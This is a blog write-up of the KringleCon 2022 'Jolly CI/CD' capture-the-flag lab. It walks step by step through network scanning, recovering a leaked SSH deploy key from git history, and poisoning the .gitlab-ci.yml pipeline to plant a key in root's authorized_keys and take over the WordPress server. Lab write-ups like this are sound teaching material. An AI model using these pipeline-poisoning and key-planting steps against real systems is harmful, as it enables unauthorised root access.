<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  

  <title>
    
      KringleCon 2022 Jolly CI/CD &middot; Tijjjy Blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tijjjy Blog" />
</head>


  <body>
    <nav class="nav">
      <div class="nav-container">
        <a href="/">
          <h2 class="nav-title">Tijjjy Blog</h2>
        </a>
        <ul class="nav-social-icons">
          
          
            <li><a target="_blank" href="https://github.com/tijjjy"><i class="fab fa-github"></i></a></li>
          
          
          
        </ul>
      </div>
    </nav>

    <main>
      <div class="post">

  <div class="post-info">
    
      <time datetime="2022-12-11 00:00:00 +0800">December 11, 2022</time>
    
  </div>
  <h1 class="post-title">
    <div>KringleCon 2022 Jolly CI/CD</div>
  </h1>

  <p>Hello, this is my write up of the Jolly CI/CD challenge for kringlecon 2022.</p>

<p>The aim of this challenge is to expoit the CI/CD pipeline and gain access to the wordpress server. I can say this is a pretty difficult challenge and really gets you thinking. The challenge requires knowledge of git and how CI/CD pipelines work.</p>

<p><strong>Note:</strong> This challenge does take 4-5 minutes to start all of the containers required for the challenge.</p>

<p>Below here we have the starting terminal which you see when starting the challenge.
<img src="/images/kringlecon2022/jollycicd/jollycicd-01.png" alt="Alt text" title="Starting screen" /></p>

<p>Typically the first thing I do when I have a shell whether it be a vm or container is check whether I have sudo privileges, most often than not low privilege users are given more sudo privileges than they actually need, this creates a security risk and path for an attacker to escalate to root. This was shown in the Prison escape write up I did which can be found here -&gt; <a href="/kringlecon2022/prisonescape">Prison Escape Writeup</a></p>

<p>To check what sudo privileges you have can be done with the following command.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span></code></pre></figure>

<p>It looks like we can run sudo without any password so lets go ahead and escalate to root</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>bash
<span class="nb">whoami</span></code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-02.png" alt="Alt text" title="escalate to root" /></p>

<p>Now the target is not on the box we are currently on, as mentioned in the challenge instructions we need to exploit the wordpress server.</p>

<p>Lets go ahead and get our ip address and then use the tool nmap to scan the local subnet and attempt to the the IP addresses of the targets.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ip a | <span class="nb">grep </span>inet</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-03.png" alt="Alt text" title="getting ip address" /></p>

<p>I will use the following command to scan the local subnet.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-T4</span> <span class="nt">-v</span> 172.18.0.0/16</code></pre></figure>

<p>Once the scan is completed you will see we found the targets. Although there are multiple hosts that were returned, we only need to worry about the following hosts</p>
<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>172.18.0.88</td>
          <td>wordpress.local_docker_network</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>172.18.0.150</td>
          <td>gitlab.local_docker_network</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-04.png" alt="Alt text" title="nmap scan" /></p>

<p>Now since we have no way of viewing the gitlab site via a GUI, we will need to use curl to take advantage of the gitlab api to view all public repositories to see what we can clone and possibly exploit.</p>

<p>This can be done by running the following command and piping the output into jq to parse the json response.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">--request</span> GET <span class="s2">"http://gitlab.local_docker_network/api/v4/projects"</span> | jq</code></pre></figure>

<p>If successful you will see the following output, indicating that there is a public git repository we can clone called “Wordpress.Flag.Net.Internal” indicating it might be the source code of the wordpress site we need to exploit.
<img src="/images/kringlecon2022/jollycicd/jollycicd-05.png" alt="Alt text" title="gitlab projects" /></p>

<p>Lets go ahead and clone the git repo and take a look what is inside.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-06.png" alt="Alt text" title="cloning the repo" /></p>

<p>Looking at the gitlab-ci.yml file, it looks like the repo utilises a gitlab CI/CD pipeline to push changes to the wordpress server, take note as we can take advantage of this to gain acess to the target server if we can find a way to push changes to the git repository.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> .gitlab-ci.yml</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-08.png" alt="Alt text" title="gitlab-ci.yml" /></p>

<p>One thing developers do with git repositories is forget to gitignore secrets or accidentally commit secrets to a git repo. More often than not developers will push another commit removing these secrets without realising that the secrets are still there, just in previous commits.</p>

<p>Lets go ahead and do a git log to see what the previous commit comments look like.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git log</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-07.png" alt="Alt text" title="git log" /></p>

<p>Now we can see all the previous commits that have been made. using a command git diff you can actually see the changes to each file that was made, such as removing or adding in secrets.</p>

<p>A commit that caught my eye was the commit with the message “whoops”, I think the developer made a mistake, lets do a git diff between that commit and the previous commit to see what was changed.</p>

<p>Grab the commit hashes of the commits you want to compare and run git diff against them</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-09.png" alt="Alt text" title="git log" /></p>

<p>Wow look at that, the developer accidentally added in an ssh private key named “.deploy” and attempted to remove it from the git repo by doing another commit to remove it. Notice how the ssh key is named “.deploy” this might indicate this ssh key is used to push changes to the git repo. Lets try and take advantage of this.</p>

<p>Copy the key into a file such as “key.pem” and remove all the extra dashes (“-“) that the commit diff added in. The result should look like this.
<img src="/images/kringlecon2022/jollycicd/jollycicd-10.png" alt="Alt text" title="ssh key" /></p>

<p>Don’t forget to change the key permissions to 0600 otherwise openssh will error out.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod </span>0600 key.pem</code></pre></figure>

<p>Now that we can push to the git repo using this ssh private key, lets go ahead and make our own ssh keypair that we can push to the wordpress server by abusing the gitlab CI/CD pipeline.</p>

<p>Generate a keypair with the following command and just hit enter until done.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh-keygen</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-11.png" alt="Alt text" title="ssh keypair generation" /></p>

<p>Now cat the public key you just created. Take note of the public key as we will be putting the output into the .gitlab-ci.yml file next.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /home/samways/.ssh/id_rsa.pub</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-12.png" alt="Alt text" title="cat pub key" /></p>

<p>We will now write a oneliner command to add into the CI/CD pipeline scripts to add our ssh key to the wordpress root users keys.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal <span class="s1">'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBAKLEGKk85jbmxLc4U6n1t7AgZeNeGnEJcagj+/DbCKsOTKCdscARbTncPU/QwlTFJqIb+bja9s2ms5c7dG9Xzut3Ga21IrtbB1uVOtDPVnRZt0uej1usRyndWWYVWRCZU15wdhUNyRzHNsnkv7xDyxf4cp25+h362a+U8hI2irWlgKWQCwHY88XUBjKkdr7NKOlnGm7I6aJfFsz5Owf0vY3nFrX1ija2UrsEAq8/XmbFrj776tlLsKxf+sjA+cCuvk5YLaggkoE/DeI9pqAhX283/C9Q5UNVKof7W/Y2U2JveF2bbuC/CEGKhAID8rwdosjAFlmq7uD+UkkHKTlVawWSh1OSF9fxTbL5+ou33nfhz4kp/A7nLcb0VTdTzoSXKE46puFlD61Gdl7zUDa/ry2NmWrQ3tCfoLSd35uysbbEiO+19tFyIb+nNKVRhhWJV2F8SAxF3X/eEvNxMOjdsvxaZAEflWJUOJMtJT6JaOrJY15aVTiHvcTyQXFFMKk= samways@grinchum-land.flag.net.internal" &gt;&gt; /root/.ssh/authorized_keys'</span></code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-13.png" alt="Alt text" title=".gitlab-ci.yml" /></p>

<p>Add the oneliner command above, replacing the my public key with yours, into the script: section in the .gitlab-ci.yml file as seen below.<br />
<img src="/images/kringlecon2022/jollycicd/jollycicd-14.png" alt="Alt text" title=".gitlab-ci.yml" /></p>

<p>We need to do one more step to be able to push to the repo, run the following commands, replacing the Identity file location to wherever you stored the ssh private key you found in the git logs.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mkdir</span> /root/.ssh
nano /root/.ssh/config

Paste <span class="k">in </span>the following config

Host gitlab.flag.net.internal
  HostName gitlab.flag.net.internal
  User git
  IdentityFile /home/samways/wordpress.flag.net.internal/key.pem</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-15.png" alt="Alt text" title="ssh config" />
<img src="/images/kringlecon2022/jollycicd/jollycicd-16.png" alt="Alt text" title="ssh config" /></p>

<p>What we just did was create an ssh config for the user git at the gitlab hostname. Now when we attempt to git push using ssh, it will know which ssh key to use when authenticating.</p>

<p>Awesome, now we are good to go and push our changes and take over the wordpress server. In order, run the following commands to add your file changes, commit the changes with a message, and push the changes to the git repo.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git add <span class="nb">.</span>
git status
git commit <span class="nt">-m</span> <span class="s2">"wordpress takeover"</span>
git push</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-17.png" alt="Alt text" title="git push" /></p>

<p>Epic, now we have successfully pushed our changes, lets go ahead and see if it worked and attempt to authenticate to the wordpress server as root using our privatekey we generate earlier. My private key was stored here -&gt; /home/samways/.ssh/id_rsa</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa root@wordpress.flag.net.internal</code></pre></figure>

<p><img src="/images/kringlecon2022/jollycicd/jollycicd-18.png" alt="Alt text" title="ssh as root to wordpress" /></p>

<p>Look at that, we did it, we successfully found secrets in a public git repository, exploited the CI/CD pipeline and gained root access to the target wordpress server.</p>

<p>All thats left to do now is grab the flag, now for all intents and purposes I won’t show the flag, so go ahead and try the challenge yourself, It was a great challenge and you will learn a lot about git.
<img src="/images/kringlecon2022/jollycicd/jollycicd-19.png" alt="Alt text" title="flag.txt" /></p>


</div>

<div class="relatedPosts">

  
    
    
    
    

    

      
      

      

      

    

      
      

      

      

    

      
      

      

      

    

      
      

      

      

    

      
      

      

      

    

      
      

      

      

    

    
  

</div>

    </main>

    <footer>
      <span>
        &copy; <time datetime="2023-01-23 21:45:54 +0800">2023</time> Tijjjy. Powered by Jekyll and <a href="#">Rain</a> theme.
      </span>
    </footer>
  </body>
</html>
